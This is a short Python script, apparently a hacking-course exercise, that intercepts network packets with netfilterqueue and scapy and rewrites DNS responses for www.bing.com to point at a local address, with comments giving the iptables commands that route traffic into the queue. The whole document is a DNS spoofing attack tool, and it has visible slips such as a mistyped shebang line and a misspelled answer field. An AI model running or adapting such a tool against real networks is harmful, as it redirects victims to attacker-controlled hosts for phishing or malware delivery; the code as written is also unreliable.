#1/usr/bin/python

import scapy.all as scapy
import netfilterqueue

# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables --flush
# Forward: packets going through other computer
# Input/Output: packets coming into/ going out of the same computer

def process_packet(packet):
    # print(packet)
    # read data inside of packets
    scapy_packet = scapy.IP(packet.get_payload()) # converted into scapy packet

    if scapy_packet.haslayer(scapy.DNSRR): # DNS Resource Record
    # print(scapy_packet.show())
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdate="192.168.2.106")
            # manipulate DNSRR segment which has type A domain
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1 # modify ancount (deals with other dns packets)

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            # checksum checks if the packet has been modified
            # deleting them allows scapy to re-calculate chksum value

            #set payload to Packets
            packet.set_payload(str(scapy_packet)) # put it back to a normal string (we converted into scapy packet at the beginning)


    packet.accept() # forwarding packets to its destination
    # packet.drop() # dropping packets

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) # 0: queue-num
queue.run()
